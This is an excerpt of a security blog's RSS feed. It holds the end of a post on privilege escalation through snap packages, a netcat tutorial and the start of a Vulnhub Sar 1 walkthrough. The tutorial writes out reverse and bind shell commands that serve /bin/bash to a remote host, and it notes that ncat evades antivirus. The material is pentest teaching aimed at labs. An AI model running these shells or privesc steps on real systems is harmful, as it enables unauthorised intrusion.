	    &lt;span style=&#34;color:#f92672&#34;&gt;plugin&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;nil&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s move back into the &lt;code&gt;exploit&lt;/code&gt; directory and then run &lt;code&gt;snapcraft&lt;/code&gt; command to create the package then install it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo snap install --dangerous --devmode exploit_0.1_amd64.snap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once installed we see our user has been added and we can switch user and get the root shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-13.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h4 id=&#34;2-fpm&#34;&gt;2. fpm&lt;/h4&gt;
&lt;p&gt;Using fpm we&amp;rsquo;ll use the exact same file structure but change the &lt;code&gt;snap&lt;/code&gt; directory name to &lt;code&gt;meta&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;fpm -n exploit -s dir -t snap -a all meta
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-14.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we install it we see that our new user has been added and we can obtain a root shell by switching to that user,
same way as earlier.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/package_manager_privesc/privesc-15.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;As we have seen there are many techniques to escalate privileges via package managers which would make hardening this permission not the easiest
task. Therefore, only provide this permission with these risks in mind.&lt;/p&gt;
&lt;p&gt;Althrough out this tutorial the fpm package has been very useful, it&amp;rsquo;s a really nice tool to quickly create packages for our use case.
It can be installed on any of the distros but I encountered issues installing it on centos, therefore I skipped it.&lt;/p&gt;
&lt;p&gt;There are some techniques I haven&amp;rsquo;t fully explored like using &lt;strong&gt;rpm&lt;/strong&gt;, feel free to try this out on the provided cyberranges lab.&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;https://github.com/jordansissel/fpm/

http://manpages.ubuntu.com/manpages/focal/en/man8/apt.8.html

http://manpages.ubuntu.com/manpages/focal/man5/apt.conf.5.html

https://gtfobins.github.io/gtfobins/apt/

https://gtfobins.github.io/gtfobins/yum/

https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins

http://yum.baseurl.org/wiki/WritingYumPlugins.html

https://www.tecmint.com/enable-disable-and-install-yum-plug-ins/

https://gtfobins.github.io/gtfobins/snap/

https://snapcraft.io/docs/supported-snap-hooks

https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html

https://youtu.be/8ikdbyOQsLg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Netcat - All you need to know</title>
      <link>https://blog.ikuamike.io/posts/2021/netcat/</link>
      <pubDate>Thu, 08 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/netcat/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
In this article we&amp;rsquo;ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc&amp;hellip;&lt;/p&gt;
&lt;p&gt;If you would like to test out these commands in a lab environment without the need to install them on your own machine have a look at my scenario on &lt;a href=&#34;https://app.cyberranges.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;CYBERRANGES&lt;/strong&gt;&lt;/a&gt;

 using the
link below.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://app.cyberranges.com/scenario/60e782766596fe0006aeceb8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Netcat Scenario&lt;/a&gt;

&lt;/p&gt;
&lt;h2 id=&#34;variants&#34;&gt;Variants&lt;/h2&gt;
&lt;p&gt;There are several variants of netcat but most of the core functionality and command line options are very similar. Netcat having being initially written for Unix,
the variants we will look at are linux based. You can also find netcat ports for windows that support similar commands to what we&amp;rsquo;ll look at.&lt;/p&gt;
&lt;h3 id=&#34;netcat-traditional&#34;&gt;Netcat Traditional&lt;/h3&gt;
&lt;p&gt;Netcat traditional is the original implementation and was written by a guy known as Hobbit. This does not typically come preinstalled unless you are using a distro like kali linux. It is no
longer maintained and is on version 1.10.&lt;/p&gt;
&lt;p&gt;By running &lt;code&gt;apt search netcat&lt;/code&gt; on an ubuntu/debian based machine, it appears as netcat or netcat-traditional.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To install it you can then run &lt;code&gt;sudo apt install netcat-traditional&lt;/code&gt; or via compiling from source which you can get from the project page &lt;a href=&#34;https://nc110.sourceforge.io/&#34;&gt;https://nc110.sourceforge.io/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you install the different variants of netcat on your system you may have to invoke the command with the full binary name. In this case we&amp;rsquo;ll run &lt;code&gt;nc.traditional -h&lt;/code&gt; to see the command line
options.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You notice the -e option, this is not available in the openbsd version. This is the feature that is considered a security hole. More on this when we get to the shells section.&lt;/p&gt;
&lt;h3 id=&#34;gnu-netcat&#34;&gt;GNU Netcat&lt;/h3&gt;
&lt;p&gt;GNU Netcat is a rewrite of the original netcat to make it more portable with new features and fully GNU compliant. This means it can be easily installed on almost all linux distros.
This version is not available via package manager. It seems to also be no longer maintained as it&amp;rsquo;s latest version is 0.7.1 from 2004.&lt;/p&gt;
&lt;p&gt;To get it you can download the source files from the project website &lt;a href=&#34;http://netcat.sourceforge.net&#34;&gt;http://netcat.sourceforge.net&lt;/a&gt; then compile it.&lt;/p&gt;
&lt;p&gt;You need gcc and make to install successfully. The binary will be installed to /usr/local/bin/netcat. Below are the commands to use.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd netcat-0.7.1/
./configure
make
sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;netcat-openbsd&#34;&gt;Netcat OpenBSD&lt;/h3&gt;
&lt;p&gt;The Netcat OpenBSD version is a rewrite of the original netcat to include support for IPv6, proxies and unix sockets. In addition to those enhancements it is compiled to remove a feature that
is considered a gaping security hole of the application.&lt;/p&gt;
&lt;p&gt;This version is the most common and is what you will find installed by default in ubuntu distro (both desktop and server). For other linux distros you may have to install it yourself.&lt;/p&gt;
&lt;p&gt;By running &lt;code&gt;apt search netcat&lt;/code&gt; on an ubuntu machine, it appears as netcat-openbsd package.&lt;/p&gt;
&lt;p&gt;To install it you can then run &lt;code&gt;sudo apt install netcat-openbsd&lt;/code&gt;. When netcat is installed it is symlinked to nc and netcat for ease of invoking the command. We can see this
by checking the realpath of nc and netcat, they point to the same nc.openbsd binary. This can be different depending on which variant you have installed in your system.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The command line options available can be seen by running &lt;code&gt;netcat -h&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;ncat&#34;&gt;Ncat&lt;/h3&gt;
&lt;p&gt;Ncat is the reimplementation of netcat from the nmap project. This version is more feature rich and improved. I personally use this on a day to day.&lt;/p&gt;
&lt;p&gt;When installing nmap you get ncat installed as well, this applies for windows and linux. You can then run &lt;code&gt;ncat -h&lt;/code&gt; to see the command line options available.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/netcat/netcat-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You can also compile from source to install it which can be downloaded from the nmap website &lt;a href=&#34;https://nmap.org/ncat/&#34;&gt;https://nmap.org/ncat/&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;features&#34;&gt;Features&lt;/h2&gt;
&lt;p&gt;Now that we understand the different variants, let&amp;rsquo;s look at the most common features you&amp;rsquo;d use netcat for. Most of the syntax is common across the different
variants.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll focus on the 2 most recent variants, &lt;em&gt;netcat-openbsd&lt;/em&gt; and &lt;em&gt;ncat&lt;/em&gt; because they are the most recently maintained and updated.&lt;/p&gt;
&lt;h3 id=&#34;server--client-mode&#34;&gt;Server / Client mode&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Server mode&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In server mode you can use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system.&lt;/p&gt;
&lt;p&gt;By default netcat listens on tcp. The below command will listen on all interfaces on port 8080.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To specify the interface to listen on, for example localhost, you can use the below syntax for openbsd variant. Sometimes it may not be the best idea to
listen on all interfaces depending on the situation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -s 127.0.0.1 -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ncat prefers a different syntax when specifying the interface.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ncat -lvn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To listen on udp the syntax is similar to tcp but including -u option.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -l -u -v -n -p &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you noticed, the command line options can be used grouped together or separated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Client mode&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In client mode you can use netcat to connect to an open port on a system. This can be beneficial for manually checking service
banners or just checking if the port is open.&lt;/p&gt;
&lt;p&gt;For a tcp connection when connecting to IP 127.0.0.1 on port 8080, the syntax is as below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -vn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For a udp connection we only add the -u option.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -uvn 127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reverse--bind-shells&#34;&gt;Reverse / Bind Shells&lt;/h3&gt;
&lt;p&gt;Familiarity with the concept of reverse shells and bind shells is needed as it is not discussed in detail in this section as we are
only looking at how netcat facilitates them.&lt;/p&gt;
&lt;p&gt;This is very popular to pentesters and use of netcat makes it easy. I will use the server / client model for explanation.&lt;/p&gt;
&lt;p&gt;The commands used only work on ncat,netcat traditional and gnu netcat. Netcat OpenBSD is compiled to not have this feature as it is
considered a security risk.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reverse shells&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For a reverse shell, we use netcat in server mode to listen for connections then supply the shell from the client. This will allow
the session on the server to run commands on the client once the shell is received. From a pentesting perspective the server would be
the attacker machine and the client the victim machine.&lt;/p&gt;
&lt;p&gt;Server (attacker machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (victim machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -e /bin/bash 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Something to note is that, just because the openbsd version does not have this -e option, does not mean that it is impossible to get a reverse
shell when it&amp;rsquo;s installed. There are still ways it can be used to achieve a reverse shell.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bind shells&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For a bind shell, netcat in server mode listens for a connection and serves the shell process to any connecting client. Netcat running in
client mode can then connect to the server and get shell access to the server and run commands. From a pentesting perspective the server
would be the victim machine and the client the attacker machine.&lt;/p&gt;
&lt;p&gt;Server (victim machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -e /bin/bash -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (attacker machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;file-transfer&#34;&gt;File Transfer&lt;/h3&gt;
&lt;p&gt;Due to the ability to write to the connections raw, we can transfer files over the connection from one system to another without distortion.&lt;/p&gt;
&lt;p&gt;For this we don&amp;rsquo;t really care about which is the server and which is the client because the transfer can go either direction but we need
to run the listener first.&lt;/p&gt;
&lt;p&gt;To transfer a file on server1 to server2 over port 8080 can be done as below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;lt; infile   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
nc 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;gt; outfile  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To do the same in the opposite direction:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc 192.168.125.20 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;lt; infile &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt; &amp;gt; outfile &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;server2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning&lt;/h3&gt;
&lt;p&gt;This feature is not implemented in ncat but is available in the other variants. According to their website they omitted this feature because
they have a better tool for that, which would be nmap.&lt;/p&gt;
&lt;p&gt;Therefore if you find a system with netcat-openbsd and can&amp;rsquo;t install nmap you can run basic port scans as below.&lt;/p&gt;
&lt;p&gt;To scan TCP ports on a target we can use the below syntax.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -nvv -w &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -z 127.0.0.1 1-1000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To scan UDP ports on a target we can use the below syntax.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -nvv -w &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -z -u 127.0.0.1 1-1000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;traffic-redirection&#34;&gt;Traffic Redirection&lt;/h3&gt;
&lt;p&gt;This is only possible on the variants that support the -e option.&lt;/p&gt;
&lt;p&gt;Take the below scenario where server1 cannot connect directly to server3 but can only go through server2.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;server1 &amp;lt;-------------&amp;gt; server2 &amp;lt;-------------&amp;gt; server3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To redirect traffic from server1 to a web app running on server3 (192.168.125.40) on port 8080 we can execute the below ncat command on server2.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc -klvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt; -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/nc 192.168.125.40 8080&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now you can reach the web app on server3 by accessing server2 on port 8000.&lt;/p&gt;
&lt;h3 id=&#34;ncat-additional-features&#34;&gt;Ncat Additional Features&lt;/h3&gt;
&lt;p&gt;From the features the security risks can be seen because there&amp;rsquo;s no encryption on the connection as netcat will write to the connection in its
rawest form, therefore anyone sniffing the network can capture all your traffic unencrypted in the case of shells and file transfer. For bind shells,
there&amp;rsquo;s no authentication therefore anyone connecting to the port the bind shell is listening on will be able to run commands on the machine.&lt;/p&gt;
&lt;p&gt;When using ncat, some of these concerns are addressed as it allows for use of ssl as well as access control.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Encrypted Shells&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For a reverse shell we&amp;rsquo;ll use the same command syntax but add &lt;code&gt;--ssl&lt;/code&gt; to the command, same goes for bind shells.&lt;/p&gt;
&lt;p&gt;Server (attacker machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --ssl -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Client (victim machine)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --ssl -e /bin/bash 192.168.125.10 &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Access Control&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When using netcat in server mode the &lt;code&gt;--allow&lt;/code&gt; option can specify one host or network range to be allowed to connect to the port, this can be good
for the bind shell situation. Similarly, you can use &amp;ndash;deny to deny access from a specific host or network range.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nc --allow 127.0.0.1 -e /bin/bash -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above command will set the bind shell to only accept connections from localhost.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Netcat is a really great tool for network related activities, I find it really useful during CTFs and sometimes use it during pentests. There&amp;rsquo;s several other options that
we haven&amp;rsquo;t looked into feel free to explore them, but I think we&amp;rsquo;ve covered should be enough for most of your use cases.&lt;/p&gt;
&lt;p&gt;I haven&amp;rsquo;t explained the specific command line options -like -v -n because the help menu clearly explains them.&lt;/p&gt;
&lt;p&gt;Challenge for you, play around with netcat for windows (specifically ncat because of ssl feature). It&amp;rsquo;s a nice utility that can help you get reverse shells and doesn&amp;rsquo;t get flagged as a virus.&lt;/p&gt;
&lt;p&gt;Happy Hacking!&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Netcat&#34;&gt;https://en.wikipedia.org/wiki/Netcat&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nmap.org/ncat/guide/index.html&#34;&gt;https://nmap.org/ncat/guide/index.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://netcat.sourceforge.net/&#34;&gt;http://netcat.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nc110.sourceforge.io/&#34;&gt;https://nc110.sourceforge.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://eternallybored.org/misc/netcat/&#34;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Sar 1</title>
      <link>https://blog.ikuamike.io/posts/2021/sar1/</link>
      <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/sar1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;15 Feb 2020&lt;/td&gt;
&lt;td&gt;Love&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box there&amp;rsquo;s only one port open that is running a vulnerable version of sar2html that
we take advantage of to get a low priv shell. For privilege escalation there was a cron job
running as root that was running a script we could write in.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.000040s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
MAC Address: 08:00:27:48:00:F5 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Using nmap scripts we see the existence of robots.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00042s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
